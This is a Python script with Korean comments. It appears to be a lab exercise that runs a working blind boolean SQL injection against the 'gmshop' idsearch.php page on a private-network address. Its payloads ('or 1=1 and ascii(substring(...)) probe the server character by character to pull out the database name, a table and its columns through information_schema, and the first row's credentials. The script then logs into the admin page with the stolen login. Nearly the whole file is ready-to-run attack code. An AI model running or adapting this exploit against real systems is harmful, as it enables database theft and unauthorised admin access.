from bs4 import BeautifulSoup
import requests
import re

# http://192.168.81.129/gmshop/idsearch.php?userid=
URL = 'http://192.168.81.129/gmshop/idsearch.php'
cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}



# TRUE: 해당하는 ID가 이미 있습니다. (17)
# FALSE: 사용할수있는 ID 입니다. (14)
def boolType():
    res1 = requests.get(URL, params={'userid': '\'or 1=1#'}, cookies=cookies)
    res2 = requests.get(URL, params={'userid': '\'or 1=2#'}, cookies=cookies)
    html1 = res1.content.decode('euc-kr', 'replace')
    html2 = res2.content.decode('euc-kr', 'replace')

    soup1 = BeautifulSoup(html1)
    soup2 = BeautifulSoup(html2)

    trueType = soup1.find('td', height='30')
    falseType = soup2.find('td', height='30')
    print("[TRUE]문자열: {str}\n[TRUE]문자열 길이:{len}".format(
        str=trueType.text, len=len(trueType.text)))
    print("[FALSE]문자열: {str}\n[FALSE]문자열 길이:{len}".format(
        str=falseType.text, len=len(falseType.text)))
boolType()

# 쿼리 요청 응답 마스터
def query_master(parm):
    res=requests.get(URL, params=parm, cookies=cookies)
    html=res.content.decode('euc-kr', 'replace')
    soup=BeautifulSoup(html)
    check = soup.find('td', height='30')  
    return check.text

# 데이터 베이스 길이 구하기
def get_database_length():
    for l in range(10):
        get_data = {'userid':'\' or 1=1 and length(database())={l}#'.format(l = l)}
        check = query_master(get_data)

        if (len(check) == 17):
            print("[+] 데이터베이스 길이 : %d"%l)
            break
    print("[+] 데이터베이스 길이 쿼리 : " + get_data.get('userid'))
    return l


# 데이터베이스 명 구하기
def get_database_name(length):
    database_name = ''
    for idx in range(length+1):
        for a in range(33, 127):
            get_data = {'userid': '\' or 1=1 and ascii(substring(database(), {idx}, 1))={ascii}#'.format(
                idx=idx, ascii=a)}
            check = query_master(get_data)

            if (len(check) == 17):
                database_name += chr(a)
                print("[SUCESS] {c}".format(c=database_name))
                break
    print("[+] 데이터베이스 명 : "+database_name)
    print("[+] 데이터베이스 명 쿼리 : " + get_data.get('userid'))
    return database_name



# 테이블 길이 구하기
def get_table_length(name):
    for a in range(20):
        get_data = {'userid':'\' or 1=1 and length((select table_name \
            from information_schema.tables \
            where TABLE_TYPE=\'base table\' \
            and TABLE_SCHEMA=\'{db_name}\' limit 2,1))={length}#'.format(db_name=name, length=a)}
        check = query_master(get_data)

        if (len(check) == 17):
            print("[+] 테이블 길이 : %d"%a)
            break
    print("[+] 테이블 길이 쿼리: " + get_data.get('userid'))
    return a

            
# 테이블 명 구하기 쿼리
def get_table_name_query(length, db_name):
    # ' or 1=1 and ascii(substring((select table_name from information_schema.tables where TABLE_TYPE='base table' limit 0,1),1,1))<130#
    table_name = ''
    for idx in range(length+1):
        for a in range(33,127):
            get_data = {'userid':'\' or 1=1 and ascii( \
                substring((select table_name \
                from information_schema.tables \
                where TABLE_TYPE=\'base table\' \
                and TABLE_SCHEMA=\'{db_name}\' limit 2,1),{idx},1))={ascii}#'.format(db_name = db_name, idx=idx, ascii=a)}
            check = query_master(get_data)
            
            if (len(check) == 17):
                table_name += chr(a)
                print("[SUCESS] {c}".format(c=table_name))
                break
    print("[+] 테이블 명 : "+table_name)
    print("[+] 테이블 명 쿼리: " + get_data.get('userid'))
    return table_name

# 데이터 길이 구하기
def get_col_length(name):
    for a in range(20):
        get_data1 = {'userid':'\' or 1=1 and length((select column_name \
        from information_schema.columns \
        where table_name=\'{tb_name}\' limit 3,1))={length}#'.format(tb_name=name, length=a)}
        check1 = query_master(get_data1)
        if (len(check1) == 17):
            print("[+] check1 데이터 길이 : %d"%a)
            break

    for b in range(20):
        get_data2 = {'userid':'\' or 1=1 and length((select column_name \
        from information_schema.columns \
        where table_name=\'{tb_name}\' limit 4,1))={length}#'.format(tb_name=name, length=b)}
        check2 = query_master(get_data2)
        if (len(check2) == 17):
            print("[+] check2 데이터 길이 : %d"%b)
            break
    print("[+] 데이터 길이 쿼리: " + get_data1.get('userid'))
    print("[+] 데이터 길이 쿼리: " + get_data2.get('userid'))
    return a, b


# 데이터 문자 구하기
def get_col_name(name, data_num1, data_num2):
    data_str1 = ''
    data_str2 = ''
    for n in range(data_num1+1):
        for a in range(33, 127):
            get_data1 = {
                'userid':'\' or 1=1 and ascii(substring(( \
                    select column_name from information_schema.columns \
                     where table_name=\'{tb_name}\' limit 3,1), {num}, 1))={ascii}#'.format(tb_name=name, num=n, ascii=a)}
            data1 = query_master(get_data1)            

            if (len(data1) == 17):
                data_str1+=chr(a)
                print("[+] 데이터 문자열 : %s"%data_str1)
                break

    for n in range(data_num2+1):
        for b in range(33, 127):
            get_data2 = {
                'userid':'\' or 1=1 and ascii(substring(( \
                    select column_name from information_schema.columns \
                     where table_name=\'{tb_name}\' limit 4,1), {num}, 1))={ascii}#'.format(tb_name=name, num=n, ascii=b)}    
            data2 = query_master(get_data2)

            if (len(data2) == 17):
                data_str2+=chr(b)
                print("[+] 데이터 문자열 : %s"%data_str2)
                break
    print("[+] 첫 번째 컬럼 데이터 : %s"%data_str1)
    print("[+] 두 번째 컬럼 데이터 : %s"%data_str2)
    print("[+] 데이터 문자열 쿼리 : " + get_data1.get('userid'))
    print("[+] 데이터 문자열 쿼리 : " + get_data2.get('userid'))
    return data_str1, data_str2

# 데이터 길이
def get_get_data_len(col1, col2, name):
    for a in range(20):
        get_data1 = {
            'userid' : '\' or 1=1 and length((select {col1} from \
            {tb_name} limit 0, 1))={len}#'.format(col1=col1, tb_name=name, len=a)
            }
        get_data2 = {
            'userid' : '\' or 1=1 and length((select {col2} from \
            {tb_name} limit 0, 1))={len}#'.format(col2=col2, tb_name=name, len=a)
            }
        data1 = query_master(get_data1)
        data2 = query_master(get_data2)

        if (len(data1) == 17 & len(data2) == 17):
            break
    print("[+] 데이터 길이 : %d"%a)
    print("[+] 데이터 길이 쿼리 : " + get_data1.get('userid'))
    print("[+] 데이터 길이 쿼리 : " + get_data2.get('userid'))
    return a



# 데이터 문자 구하기
def get_get_data_name(name,col1, col2, num):
    data_str1 = ''
    data_str2 = ''
    for n in range(num+1):
        for a in range(33, 127):
            get_data1 = {'userid': '\' or 1=1 and ascii(substring((select {col1} from {tb_name} limit 0,1),{num},1))={ascii}#'.format(
                tb_name=name, col1=col1, num=n, ascii=a)}
            data1 = query_master(get_data1)            

            if (len(data1) == 17):
                data_str1+=chr(a)
                print("[+] 데이터 문자열 : %s"%data_str1)
                break
    
        for b in range(33, 127):
            get_data2 = {
                'userid': '\' or 1=1 and ascii(substring((select {col2} from {tb_name} limit 0,1),{num},1))={ascii}#'.format(
                tb_name=name, col2=col2, num=n, ascii=b)}
            data2 = query_master(get_data2)

            if (len(data2) == 17):
                data_str2+=chr(b)
                print("[+] 데이터 문자열 : %s"%data_str2)
                break
    print("[+] 데이터 : %s"%data_str1)
    print("[+] 데이터 : %s"%data_str2)
    print("[+] 데이터 쿼리 : " + get_data1.get('userid'))
    print("[+] 데이터 쿼리 : " + get_data2.get('userid'))
    return data_str1, data_str2

# admin_login
def admin_login(d1,d2,id, pw):
    print('[+] admin page 접속')
    ADMINURL='http://192.168.81.129/gmshop/admin/'
    res = requests.post(ADMINURL, data={d1:id, d2:pw}, cookies=cookies)    
    if res.status_code == 200:
        print('[+] admin page 접속 완료')  


# 데이터베이스 길이
gdbl = get_database_length()

# 데이터베이스 명 구하기
gdbn = get_database_name(gdbl)

# 테이블 길이 구하기
gtl = get_table_length(gdbn)

# 테이블 명 구하기
gtn = get_table_name_query(gtl, gdbn)

# 컬럼 길이 구하기
gcl1,gcl2 = get_col_length(gtn)

# 컬럼 명령이
gcn1, gcn2 = get_col_name(gtn, gcl1, gcl2)

# 데이터 길이
ggdl = get_get_data_len(gcn1, gcn2, gtn)

# 데이터 문자 구하기
a_id, a_pw = get_get_data_name(gtn, gcn1, gcn2, ggdl)

# admin 페이지 로그인
admin_login(gcn1, gcn2, a_id, a_pw)
